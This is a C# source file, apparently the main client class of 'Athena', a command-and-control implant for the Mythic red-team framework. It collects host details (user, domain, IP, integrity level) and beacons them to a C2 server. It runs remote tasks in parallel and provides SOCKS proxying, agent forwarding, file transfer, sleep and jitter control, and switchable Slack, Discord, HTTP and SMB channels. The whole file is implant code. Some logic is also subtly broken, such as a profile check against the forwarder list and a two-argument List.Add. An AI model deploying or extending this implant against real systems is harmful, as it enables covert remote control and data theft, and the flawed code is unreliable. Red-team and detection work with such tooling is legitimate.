using Athena.Commands;
using Athena.Commands.Model;
using Athena.Models;
using Athena.Models.Athena.Commands;
using Athena.Models.Mythic.Checkin;
using Athena.Models.Mythic.Tasks;
using Athena.Models.Mythic.Response;
using Athena.Utilities;
using Athena.Models.Config;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using Athena.Handler.Common;

namespace Athena
{
    public class AthenaClient
    {
        public IProfile profile { get; set; }
        public CommandHandler commandHandler { get; set; }
        public SocksHandler socksHandler { get; set; }
        public ForwarderHandler forwarderHandler { get; set; }
        public bool exit { get; set; }
        List<IProfile> availableProfiles { get; set; }
        List<IForwarder> availableForwarders { get; set; }
        public AthenaClient()
        {
            this.exit = false;
            this.availableProfiles = GetProfiles();
            this.profile = SelectProfile(0);
            this.socksHandler = new SocksHandler();
            this.commandHandler = new CommandHandler();
            this.forwarderHandler = new ForwarderHandler();
            this.commandHandler.SetSleepAndJitter += SetSleepAndJitter;
            this.commandHandler.StartForwarder += StartForwarder;
            this.commandHandler.StopForwarder += StopForwarder;
            this.commandHandler.StartSocks += StartSocks;
            this.commandHandler.StopSocks += StopSocks;
            this.commandHandler.ExitRequested += ExitRequested;
            this.commandHandler.SetProfile += SetProfile;
            this.commandHandler.ListForwarders += ListForwarders;

        }
        /// <summary>
        /// Select the initial C2 Profile Configuration
        /// </summary>
        /// <param name="choice">The config to switch to, if null a random one will be selected</param>
        private IProfile SelectProfile(int choice)
        {
            return this.availableProfiles[choice];
        }

        /// <summary>
        /// Get available C2 Profile Configurations
        /// </summary>
        private List<IProfile> GetProfiles()
        {
            List<string> profiles = new List<string>();
            List<IProfile> configs = new List<IProfile>();
#if WEBSOCKET
profiles.Add("Athena.Profiles.Websocket");
#endif
#if HTTP
profiles.Add("Athena.Profiles.HTTP");
#endif
#if SLACK
profiles.Add("Athena.Profiles.Slack");
#endif
#if DISCORD
profiles.Add("Athena.Profiles.Discord");
#endif
#if SMBPROFILE
profiles.Add("Athena.Profiles.SMB");
#endif

#if NATIVEAOT
            configs.Add(profiles.FirstOrDefault().ToUpper(), new Config());
#else

#if DEBUG
            profiles.Add("Athena.Profiles.Debug");
#endif
            foreach (var profile in profiles)
            {
                try
                {
                    Assembly profileAsm = Assembly.Load($"{profile}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");

                    if (profileAsm == null)
                    {
                        continue;
                    }
                    foreach (Type t in profileAsm.GetTypes())
                    {
                        if (typeof(IProfile).IsAssignableFrom(t))
                        {
                            Debug.WriteLine($"[{DateTime.Now}] Adding profile: {profile}");
                            IProfile config = (IProfile)Activator.CreateInstance(t);
                            
                            //Make sure we haven't hit one of the expiration dates
                            Misc.CheckExpiration(config.killDate);

                            //Subscribe to TaskingReceived events
                            Debug.WriteLine($"[{DateTime.Now}] Subscribing to OntaskingReceived");
                            config.SetTaskingReceived += OnTaskingReceived;

                            //Add profile to our tracker
                            configs.Add(config);
                        }
                    }
                }
                catch
                {
                    Debug.WriteLine($"[{DateTime.Now}] Failed to load assembly for {profile}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
                }
            }
#endif
            return configs;
        }

        #region Communication Functions      
        /// <summary>
        /// Performa  check-in with the Mythic server
        /// </summary>
        public async Task<bool> CheckIn()
        {
            Checkin ct = new Checkin()
            {
                action = "checkin",
                ip = Dns.GetHostEntry(Dns.GetHostName()).AddressList[0].ToString(),
                os = Environment.OSVersion.ToString(),
                user = Environment.UserName,
                host = Dns.GetHostName(),
                pid = Process.GetCurrentProcess().Id,
                uuid = this.profile.uuid,
                architecture = await Misc.GetArch(),
                domain = Environment.UserDomainName,
                integrity_level = TokenHandler.getIntegrity(),
            };

            try
            {
                CheckinResponse res = await this.profile.Checkin(ct);

                if(res.status == "failed")
                {
                    return false;
                }

                await this.updateAgentInfo(res);

                return true;
            }
            catch (Exception e)
            {
                return false;
            }
        }

        /// <summary>
        /// Parse the GetTaskingResponse and forward them to the required places
        /// </summary>
        /// <param name="responseString">Response from the Mythic server</param>

        private async void OnTaskingReceived(object sender, TaskingReceivedArgs args)
        {
            //Pass up socks messages
            if (args.tasking_response.socks is not null)
            {
                try
                {
                    Debug.WriteLine($"[{DateTime.Now}] Handling {args.tasking_response.socks.Count} socks messages.");
                    HandleSocks(args.tasking_response.socks);
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e.ToString());

                }
            }

            if (args.tasking_response.delegates is not null)
            {
                try
                {
                    Debug.WriteLine($"[{DateTime.Now}] Handling {args.tasking_response.delegates.Count} delegates.");
                    HandleDelegates(args.tasking_response.delegates);
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e.ToString());
                }
            }

            if (args.tasking_response.responses is not null)
            {
                try
                {
                    Debug.WriteLine($"[{DateTime.Now}] Handling {args.tasking_response.responses.Count} Mythic responses. (Upload/Download)");
                    HandleMythicResponses(args.tasking_response.responses);
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e.ToString());
                }
            }
            Parallel.ForEach(args.tasking_response.tasks, async c =>
            {
                Debug.WriteLine($"[{DateTime.Now}] Executing task with ID: {c.id}");
                //Does this need to be a Task.Run()?
                Task.Run(() => this.commandHandler.StartJob(c));
            });
        }

        #endregion
        #region Helper Functions
        /// <summary>
        /// EventHandler to update the sleep and jitter
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private void SetSleepAndJitter(object sender, TaskEventArgs e)
        {
            StringBuilder sb = new StringBuilder();
            ResponseResult result = new ResponseResult()
            {
                completed = true,
                task_id = e.job.task.id
            };
            //var sleepInfo = JsonSerializer.Deserialize<Dictionary<string, string>>(e.job.task.parameters, JsonSerializerOptions.Default);
            Dictionary<string, string> sleepInfo = Misc.ConvertJsonStringToDict(e.job.task.parameters);
            try
            {
                this.profile.sleep = int.Parse(sleepInfo["sleep"]);
                sb.AppendLine($"Updated sleep to: {sleepInfo["sleep"]}");
                this.profile.jitter = int.Parse(sleepInfo["jitter"]);
                sb.AppendLine($"Updated jitter to: {sleepInfo["jitter"]}");
            }
            catch
            {
                sb.AppendLine("Invalid sleep or jitter specified");
                result.status = "error";
            }
            result.user_output = sb.ToString();

            TaskResponseHandler.AddResponse(result.ToJson());

        }
        /// <summary>
        /// EventHandler to set the current profile
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">ProfileEventArgs containing the MythicJob object</param>
        private void SetProfile(object sender, ProfileEventArgs e)
        {
            var profileInfo = Misc.ConvertJsonStringToDict(e.job.task.parameters);
            int choice;
            var response = new ResponseResult
            {
                completed = true,
                task_id = e.job.task.id,

            };

            if (int.TryParse(profileInfo["id"], out choice) && !(this.availableForwarders.Count > choice))
            {
                this.profile.StopBeacon();
                this.profile = SelectProfile(choice);
                this.profile.StartBeacon();
                response.user_output = $"Updated profile to: {this.profile.GetType()}";
            }
            else
            {
                response.user_output = "Invalid profile specified";
                response.status = "error";
            }
            TaskResponseHandler.AddResponse(response);
            return;
        }

        /// <summary>
        /// EventHandler to start the forwarder
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private async void StartForwarder(object sender, TaskEventArgs e)
        {
            //var res = this.forwarder.Link(e.job, this.profile.uuid).Result;
            var res = await this.forwarderHandler.LinkForwarder(e.job, e.job.task.id, this.profile.uuid);
            TaskResponseHandler.AddResponse(res.ToJson());
        }
        /// <summary>
        /// EventHandler to stop the forwarder
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private void StopForwarder(object sender, TaskEventArgs e)
        {
            bool success = forwarderHandler.UnlinkForwarder(e.job).Result;
            //this.forwarder.Unlink();
            TaskResponseHandler.AddResponse(new ResponseResult
            {
                user_output = success ? "Successfully unlinked from Agent" : "Failed to unlink agent, ID was invalid.",
                task_id = e.job.task.id,
                completed = true,
                status = success ? String.Empty : "error"
            }.ToJson());
        }

        private void ListForwarders(object sender, TaskEventArgs e)
        {
            //this.forwarder.Unlink();
            TaskResponseHandler.AddResponse(new ResponseResult
            {
                user_output = forwarderHandler.ListForwarders().Result,
                task_id = e.job.task.id,
                completed = true,
            }.ToJson());
        }
        /// <summary>
        /// EventHandler to update the Sleep and Jitter
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private void StartSocks(object sender, TaskEventArgs e)
        {
            if (this.socksHandler.Start().Result)
            {
                TaskResponseHandler.AddResponse(new ResponseResult
                {
                    user_output = "Socks Started",
                    completed = true,
                    task_id = e.job.task.id,
                }.ToJson());
            }
            else
            {
                TaskResponseHandler.AddResponse(new ResponseResult
                {
                    user_output = "Failed to start socks",
                    completed = true,
                    task_id = e.job.task.id,
                    status = "error"
                }.ToJson());
            }
        }
        /// <summary>
        /// EventHandler to starts socks forwarder
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private void StopSocks(object sender, TaskEventArgs e)
        {
            if (this.socksHandler.Stop().Result)
            {
                TaskResponseHandler.AddResponse(new ResponseResult
                {
                    user_output = "Socks stopped",
                    completed = true,
                    task_id = e.job.task.id,
                }.ToJson());
            }
            else
            {
                TaskResponseHandler.AddResponse(new ResponseResult
                {
                    user_output = "Failed to stop socks",
                    completed = true,
                    task_id = e.job.task.id,
                    status = "error"
                }.ToJson());
            }
        }
        /// <summary>
        /// EventHandler to stop socks forwarder
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private void ExitRequested(object sender, TaskEventArgs e)
        {
            TaskResponseHandler.AddResponse(new ResponseResult
            {
                user_output = @"Wisdom's daughter walks alone. The mark of Athena burns through Rome",
                completed = true,
                task_id = e.job.task.id,
            }.ToJson());
            this.exit = true;
        }

        /// <summary>
        /// Handles SOCKS messages received from the Mythic server
        /// </summary>
        /// <param name="socks">List of SocksMessages</param>
        private async Task HandleSocks(List<SocksMessage> socks)
        {
            Parallel.ForEach(socks, sm =>
            {
                Task.Run(() =>
                {
                    this.socksHandler.HandleMessage(sm);
                });
            });
        }

        /// <summary>
        /// Handle delegate messages received from the Mythic server
        /// </summary>
        /// <param name="delegates">List of DelegateMessages</param>
        private async Task HandleDelegates(List<DelegateMessage> delegates)
        {
            Debug.WriteLine($"[{DateTime.Now}] Passing to forwarder Handler.");
            await this.forwarderHandler.HandleDelegateMessages(delegates);
        }

        /// <summary>
        /// Handle response result messages received from the Mythic server
        /// </summary>
        /// <param name="responses">List of MythicResponseResults</param>
        private async Task HandleMythicResponses(List<MythicResponseResult> responses)
        {
            Parallel.ForEach(responses, async response =>
            {
                if (await this.commandHandler.HasUploadJob(response.task_id))
                {
                    await this.commandHandler.HandleUploadPiece(response);
                }

                if (await this.commandHandler.HasDownloadJob(response.task_id))
                {
                    await this.commandHandler.HandleDownloadPiece(response);
                }
            });
        }

        /// <summary>
        /// Update the agent information on successful checkin with the Mythic server
        /// </summary>
        /// <param name="res">CheckIn Response</param>
        public async Task<bool> updateAgentInfo(CheckinResponse res)
        {
            try
            {
                foreach (IProfile config in availableProfiles)
                {
                    config.uuid = res.id;
                    if (config.encrypted)
                    {
                        config.crypt = new PSKCrypto(res.id, this.profile.psk);
                    }
                }
                return true;
            }
            catch
            {
                return false;
            }
        }
        #endregion
    }
}
